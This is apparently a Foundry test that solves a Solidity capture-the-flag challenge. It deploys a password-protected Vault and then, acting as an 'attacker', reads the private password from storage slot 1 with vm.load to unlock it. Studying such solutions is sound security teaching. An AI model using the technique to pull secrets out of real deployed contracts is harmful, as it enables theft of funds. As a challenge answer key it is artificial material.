// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Vault} from "../Vault.sol";

contract VaultTest is Test {
    Vault vault;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        bytes32 password = bytes32(bytes(("Muhammad")));
        vault = new Vault(password);
    }
    function test_Challenge8_Passed() public {
        breakVault();
    }
    function breakVault() public {
        vm.startPrank(attacker);
        bytes32 stealedPassword = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(stealedPassword);
        assertEq(vault.locked(), false);
    }
}